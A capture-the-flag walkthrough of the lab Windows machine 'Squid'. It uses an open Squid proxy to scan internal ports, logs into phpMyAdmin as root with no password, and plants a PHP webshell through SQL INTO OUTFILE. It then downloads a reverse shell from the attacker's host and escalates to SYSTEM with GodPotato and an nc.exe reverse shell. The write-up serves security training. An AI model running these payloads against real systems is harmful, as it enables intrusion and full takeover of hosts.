---
machine: Squid
platform: Proving Grounds
category: Windows
difficulty: Medium
tags: [squid-proxy, port-scanning-via-proxy, phpmyadmin, godpotato, seimpersonate]
date: 2026-07-27
status: retired
summary: A Windows box fronted entirely by a Squid HTTP proxy — testing proxy-relayed port scanning to uncover internal-only services, default credentials on an exposed phpMyAdmin instance, a SQL `INTO OUTFILE` webshell, and a SeImpersonatePrivilege abuse tool for SYSTEM.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[~/oscp/squid]
└─$ nmap-full 192.168.204.189
[*] Running fast port discovery on 192.168.204.189...
[sudo] password for kali: 
[*] Open ports: 135,139,445,3128,49666,49667
[*] Running full scan on 192.168.204.189...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-27 19:32 -0400
Nmap scan report for 192.168.204.189
Host is up (0.052s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3128/tcp  open  http-proxy    Squid http proxy 4.14
|_http-server-header: squid/4.14
|_http-title: ERROR: The requested URL could not be retrieved
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-27T23:33:01
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.70 seconds

```

We see squid proxy on port 3128 running version 4.14. This exploit catches my eye: https://github.com/advisories/GHSA-gf37-7jp8-4qpf  

```text
Squid through 4.14 and 5.x through 5.0.5, in some configurations, allows information disclosure because of an out-of-bounds read in WCCP protocol data. This can be leveraged as part of a chain for remote code execution as nobody.
```

After trying to chase this exploit down, failing, and spending maybe half an hour scouring the web to find another public exploit for the squid proxy, I decide to shift gears and look at HackTricks for pentesting Squid.

Maybe instead of trying to RCE into it directly, we use the native proxying function to re-enumerate.

We can add the squid proxy as a proxy to our Firefox and then scan open ports via [[spose.py]] a squid http proxy port scanner.

```bash
──(kali㉿kali)-[~/oscp/squid]
└─$ python3 spose.py --proxy http://192.168.204.189:3128 --target 192.168.204.189           
Scanning default common ports
Using proxy address http://192.168.204.189:3128
192.168.204.189:3306 seems OPEN
192.168.204.189:8080 seems OPEN
```

Navigating to 8080 we get a file that says that our host squid is unable to connect to this MySQL server.

## Foothold

We can navigate to `http://192.168.204.189:8080/phpmyadmin` and login to MySQL with default credentials 'root' (no password)

From there we find that we have all permissions and can perform a INTO OUTFILE webshell

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "C:\wamp\www\shell.php"
```

From there I can navigate to the cmd= endpoint and pull down my php revshell and connect to it:

```text
http://192.168.204.189:8080/shell.php?cmd=powershell.exe iwr -uri http://192.168.45.188:9999/ivan.php -Outfile C:\wampp\www\ivan.php

http://192.168.204.189:8080/ivan.php
```

Immediately upon gaining foothold access we check `whoami /priv` and notice that as local system we have SeImpersonatePrivilege. This means we can easily exploit it using GodPotato to run a reverse shell (with netcat being the most stable in my experience).

```powershell
PS C:\Users\Public\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeSystemtimePrivilege         Change the system time                    Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

## Privilege Escalation

```powershell
PS C:\Users\Public\Documents> ./potato -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.188 1337"
.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.188 1337"
[*] CombaseModule: 0x140714478272512
[*] DispatchTable: 0x140714480585920
[*] UseProtseqFunction: 0x140714479963184
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\8def1ca2-f42c-4ea5-8dd7-6bcc8ff999ae\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00000c02-0e58-ffff-046a-2f08895159c3
[*] DCOM obj OXID: 0xbac0ce6a6fa0ea33
[*] DCOM obj OID: 0x5c82be207610b093
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 876 Token:0x608  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 2828

┌──(kali㉿kali)-[~/oscp/squid]
└─$ rlwrap -cAr nc -lvnp 1337                      
listening on [any] 1337 ...
connect to [192.168.45.188] from (UNKNOWN) [192.168.204.189] 50206
Microsoft Windows [Version 10.0.17763.2300]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Public\Documents>whoami
whoami
nt authority\system
```

And with that the box is pwned, we LOVE godpotato.
